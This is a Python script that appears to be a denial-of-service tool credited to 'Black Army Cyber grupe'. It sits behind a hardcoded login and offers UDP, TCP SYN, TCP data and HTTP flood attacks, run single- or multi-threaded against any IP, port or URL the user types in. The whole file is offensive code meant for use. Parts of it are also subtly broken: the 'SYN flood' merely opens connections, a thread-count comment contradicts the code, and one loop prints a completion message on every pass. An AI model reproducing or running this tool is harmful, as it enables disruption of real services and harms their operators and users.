import os
import socket
import random
import time
import threading
import requests

def clear():
    os.system("cls" if os.name == "nt" else "clear")
    
time.sleep(3)
os.system("Loading....")

time.sleep(3)
os.system("clear")
print("""

  ██╗ ████╗    ██╗       ██████╗  ████╗    ██╗ ███████╗
  ██║ ██ ██║   ██║      ██╔═══██║ ██ ██║   ██║ ██╔════╝
  ██║ ██║ ██║  ██║  ██╗ ██║   ██║ ██║ ██║  ██║ ██║
  ██║ ██║  ██║ ██║  ██║ ██║   ██║ ██║  ██  ██║ ███████╗
  ██║ ██║   ██ ██║      ██║   ██║ ██║   ██ ██║ ██╔════╝
  ██║ ██║    ████║       ██████╔╝ ██║    ████║ ███████╗
  ╚═╝ ╚═╝    ╚═══╝       ╚═════╝  ╚═╝    ╚═══╝ ╚══════╝
""")

# UDP Flood Methods
def udp_plain_flood(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    payload = b"A" * packet_size  # Fixed payloaf
        
    print(f"[*] Starting UDP Plain flood on {ip}:{port} with {packet_size}-byte packets for {duration} seconds...")
    try:
        while time.time() < end_time:
            time.sleep(0.2)
            print(f"[+] UDP Plain flood complete! Sent {packet_count} packets.")
            sock.sendto(payload, (ip, port))
            packet_count += 1
    except Exception as e:
        print(f"[!] Error during UDP Plain flood: {e}")
    finally:
        sock.close()
        print(f"[+] UDP Plain flood complete! Sent {packet_count} packets.")
                                                                                                                  

def udp_random_flood(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    print(f"[*] Starting UDP Random flood on {ip}:{port} with {packet_size}-byte packets for {duration} seconds...")
    try:
        while time.time() < end_time:
            time.sleep(0.2)
            print("\033[48;5;3mStarting UDP Random flood on \033[0m \033[32m" +str(ip)+ " \033[33m0k..!\033[0m")
            print("\033[33m Starting UDP Random flood on \033[97m" +str(packet_count)+ " \033[38;5;5mInfo-running\033[0m")
            payload = random.randbytes(packet_size)  # Random payload
            sock.sendto(payload, (ip, port))
            packet_count += 1
    except Exception as e:
        print(f"[!] Error during UDP Random flood: {e}")
    finally:
        sock.close()
        print(f"[+] UDP Random flood complete! Sent {packet_count} packets.")

# TCP Flood Methods
def tcp_syn_flood_single(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    end_time = time.time() + duration
    packet_count = 0

    print(f"[*] Starting TCP SYN flood (Single) on {ip}:{port} for {duration} seconds...")
    try:
        while time.time() < end_time:
            time.sleep(0.2)
            print("\033[48;5;1mStarting TCP SYN flood 0ne-Threads \033[0m \033[97m" +str(ip)+ " \033[33m0k..!\033[0m")
            print("\033[91m Starting TCP SYN flood 0ne-Threads \033[32m" +str(packet_count)+ " \033[94mnumb-attack\033[0m")
            sock.connect_ex((ip, port))  # SYN flood doesn't complete handshake
            packet_count += 1
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # New socket each time
    except Exception as e:
        print(f"[!] Error during TCP SYN flood (Single): {e}")
    finally:
        sock.close()
        print(f"[+] TCP SYN flood (Single) complete! Sent {packet_count} SYN packets.")

def tcp_syn_flood_multi(ip, port, duration):
    end_time = time.time() + duration
    packet_count = [0]  # List to share count across threads

    def syn_worker():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        while time.time() < end_time:
            try:
                sock.connect_ex((ip, port))
                packet_count[0] += 1
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            except:
                pass
        sock.close()

    print(f"[*] Starting TCP SYN flood (Multi-threaded) on {ip}:{port} for {duration} seconds...")
    threads = [threading.Thread(target=syn_worker) for _ in range(10)]  # 300 threads
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    print(f"[+] TCP SYN flood (Multi-threaded) complete! Sent {packet_count[0]} SYN packets.")

def tcp_data_flood_single(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    end_time = time.time() + duration
    packet_count = 0
    payload = random.randbytes(packet_size)

    print(f"[*] Starting TCP Data flood (Single) on {ip}:{port} with {packet_size}-byte packets for {duration} seconds...")
    try:
        sock.connect((ip, port))
        while time.time() < end_time:
            sock.send(payload)
            packet_count += 1
    except Exception as e:
        print(f"[!] Error during TCP Data flood (Single): {e}")
    finally:
        sock.close()
        print(f"[+] TCP Data flood (Single) complete! Sent {packet_count} packets.")

def tcp_data_flood_multi(ip, port, duration, packet_size):
    end_time = time.time() + duration
    packet_count = [0]

    def data_worker():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        payload = random.randbytes(packet_size)
        try:
            sock.connect((ip, port))
            while time.time() < end_time:
                time.sleep(0.3)
                print("\033[48;5;0mStarting TCP SYN flood Multi-threads \033[0m \033[91m" +str(ip)+ " \033[33m0k..!\033[0m")
                print("\033[33m Starting TCP SYN flood Multi-threads \033[32m" +str(packet_count)+ " \033[97mnumb-attack\033[0m") 
                sock.send(payload)
                packet_count[0] += 1
        except:
            pass
        sock.close()

    print(f"[*] Starting TCP Data flood (Multi-threaded) on {ip}:{port} with {packet_size}-byte packets for {duration} seconds...")
    threads = [threading.Thread(target=data_worker) for _ in range(100)]  # 100 threads
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    print(f"[+] TCP Data flood (Multi-threaded) complete! Sent {packet_count[0]} packets.")

# HTTP Flood Method
def http_flood(url, duration):
    end_time = time.time() + duration
    request_count = 0

    print(f"[*] Starting HTTP flood on {url} for {duration} seconds...")
    try:
        while time.time() < end_time:
            time.sleep(0.2)
            print("\033[48;5;3m HTTP flood 0n \033[0m\033[48;5;0m" +str(url)+ " \033[0m \033[33m0nfire..!\033[0m")
            requests.get(url, timeout=1)
            request_count += 1
    except Exception as e:
        print(f"[!] Error during HTTP flood: {e}")
        print(f"[+] HTTP flood complete! Sent {request_count} requests.")

# Validation Function
def validate_input(prompt, min_val, max_val, input_type=int):
    while True:
        try:
            value = input_type(input(prompt))
            if min_val <= value <= max_val:
                return value
            print(f"[!] Value must be between {min_val} and {max_val}.")
        except ValueError:
            print("[!] Invalid input. Please enter a number.")

def main():
    attemps = 0
    # Print header when tool runs
    print(f"╔{'═' * 55}╗")
    print(f"║\033[48;5;1m\033[97m  Design: Kunfayz namaku{' ' * 30} \033[0m║")
    print(f"║\033[48;5;1m\033[97m  Black Army Cyber grupe{' ' * 30} \033[0m║")
    print(f"╚{'═' * 55}╝")

    while attemps < 100:
        username = input("\033[32m┏━━━━━> Enter your username: \033[0m")
        password = input("\033[32m┗━━━━━> Enter your password: \033[0m")

        if username == 'in1' and password == 'in1':
            print("\033[48;5;7m\033[30m••⟩⟩ R U A N G  P E J U A N G ...!!\033[0m")
            break
        else:
            print('Incorrect credentials. Check if you have Caps lock on and try again.')
            attemps += 1
            continue
    
    print("\033[32m┏━━Protocols━━⬣")
    print("\033[32m┗━> UDP press 1")
    print("\033[32m┗━> TCP press 2")
    print("\033[32m┗━> HTTP press 3")
    
    protocol = input("\033[48;5;7m\033[30mSELECT PROTOKOL (1-3):\033[0m\033[32m \033[0m").strip()

    if protocol == "1":  # UDP
        print("\033[48;5;3mUDP METODS:\033[0m")
        print("\033[32m┏━━━> UDP Plain press 1")
        print("\033[32m┗━━━> UDP Random press 2")
        method = input("\033[48;5;3m Select method (1-2):\033[0m\033[32m \033[0m").strip()
        print("┏━━━━━━━━━━━⬣")
        ip = input("┗━> IP Server: ")
        port = validate_input("┗━> Port (80): ", 1, 65535)
        duration = validate_input("┗━> Flood duration: ", 1, float('inf'), float)
        packet_size = validate_input("┗━> Enter packet size in bytes (1-65500): ", 1, 65500)
        
        if method == "1":
            udp_plain_flood(ip, port, duration, packet_size)
        elif method == "2":
            udp_random_flood(ip, port, duration, packet_size)
        else:
            print(f"[!] Invalid UDP method.")

    elif protocol == "2":  # TCP
        print("\033[48;5;7m\033[30m TCP METHODS:")
        print("\033[32m┏━━━> TCP SYN Flood (press.1)")
        print("\033[32m┗━━━> TCP Data Flood (press.2)")
        method = input("\033[48;5;7m\033[30m SELECT METHODS (1-2):\033[0m\033[32m \033[0m").strip()

        ip = input("┗━>Server IP: ")
        port = validate_input("┗━> Port (80/443): ", 1, 65535)
        duration = validate_input("┗━> Flood duration in seconds: ", 1, float('inf'), float)

        print("\033[48;5;7m\033[30m Execution Style:\033[0m")
        print("\033[32m┏━━━> Single (press.1)")
        print("\033[32m┗━━━> Multi-threaded (press.2)")
        style = input("Select style (1-2): ").strip()

        if method == "1":
            if style == "1":
                tcp_syn_flood_single(ip, port, duration)
            elif style == "2":
                tcp_syn_flood_multi(ip, port, duration)
            else:
                print("[!] Invalid TCP SYN style.")
        elif method == "2":
            packet_size = validate_input("Enter packet size in bytes (1-65500): ", 1, 65500)
            if style == "1":
                tcp_data_flood_single(ip, port, duration, packet_size)
            elif style == "2":
                tcp_data_flood_multi(ip, port, duration, packet_size)
            else:
                print("[!] Invalid TCP Data style.")
        else:
            print("[!] Invalid TCP method.")

    elif protocol == "3":  # HTTP
        url = input("┏━> URL target: ")
        duration = validate_input("┗━> Duration seconds(120): ", 1, float('inf'), float)
        http_flood(url, duration)

    else:
        print("[!] Invalid protocol selected.")

if __name__ == "__main__":
    main()
